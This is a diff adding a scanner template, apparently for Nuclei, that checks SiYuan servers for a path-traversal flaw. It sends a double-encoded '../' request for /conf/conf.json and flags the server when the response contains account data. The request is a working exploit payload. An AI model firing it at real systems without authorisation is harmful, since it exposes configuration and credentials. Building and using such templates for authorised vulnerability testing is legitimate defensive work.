@@ -1,0 +1,19 @@
+id: siyuan-Pathcrossing
+info:
+  name: siyuan-Pathcrossing
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        GET /assets/%252e%252e/%252e%252e/conf/conf.json HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"account":'
+    matchers-condition: and
